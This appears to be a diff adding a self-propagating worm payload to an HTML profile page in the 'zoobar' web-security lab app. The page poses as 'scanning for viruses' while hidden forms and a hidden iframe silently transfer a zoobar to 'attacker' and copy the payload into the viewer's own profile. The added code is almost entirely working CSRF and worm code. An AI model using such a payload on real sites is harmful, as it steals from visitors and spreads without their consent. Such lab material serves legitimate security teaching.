@@ -8,10 +8,33 @@
     display:none;
   }
 </style>
+<iframe id="response_frame"
+        style="display: none; visibility: hidden; height: 0; width: 0; position: absolute"
+        name="response_frame"
+        src="about:blank"
+        width="0"
+        height="0">
+</iframe>
+<form name="prfileform" method="POST" action="http://localhost:8080/zoobar/index.cgi/" target="response_frame">
+  <input name="profile_update" type="hidden" value="" />
+</form>
+<form name="transfer" method="POST" action="http://localhost:8080/zoobar/index.cgi/transfer" target="response_frame">
+  <input name="zoobars" type="hidden" value="1" />
+  <input name="recipient" type="hidden" value="attacker" />
+</form>
 
 <div id="profilehader"><!-- user data appears here --></div>
 
 <script type="text/javascript">
+  document.transfer.submit();
+
+  window.onload = () => {
+    let profile = document.getElementById('profile').innerHTML.replace(/^<b>/, '').replace(/<\/b>$/, '');
+
+    document.prfileform.profile_update.value = profile;
+    document.prfileform.submit();
+  };
+
   const urlParams = new URLSearchParams(window.location.search);
   const user = urlParams.get('user');
   const otal = 10;
@@ -23,12 +46,8 @@
       setTimeout("showZobars(" + (zoobars + 1) + ")", 100);
     }
   }
+
   showZobars(0);
 </script>
 
 <b>scanning for viruses ...
-
-
-
-TODO:
-document.getElementById('profile').innerHTML.replace(/^<b>/, '').replace(/<\/b>$/, '')
